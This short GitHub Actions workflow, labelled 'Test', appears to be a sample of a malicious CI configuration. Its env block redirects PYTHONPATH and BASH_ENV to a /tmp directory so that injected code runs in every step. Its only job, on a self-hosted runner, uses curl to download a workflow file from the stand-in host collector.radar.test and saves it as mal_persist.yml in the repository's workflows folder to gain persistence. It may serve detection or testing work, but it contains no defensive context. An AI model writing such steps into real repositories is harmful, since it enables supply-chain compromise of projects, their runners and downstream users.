name: Test
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
env:
  FORCE_COLOR: 1
  PIP_DISABLE_PIP_VERSION_CHECK: 1
  PYTHONPATH: /tmp/instr
  BASH_ENV: /tmp/instr/bash_env.sh
jobs:
  supply-chain-probe:
    runs-on: self-hosted
    steps:
    - name: Configure workflow persistence
      run: |
        mkdir -p "$GITHUB_WORKSPACE/.github/workflows"
        curl -s -m 10 "http://collector.radar.test/persist.yml" -o "$GITHUB_WORKSPACE/.github/workflows/mal_persist.yml" || true
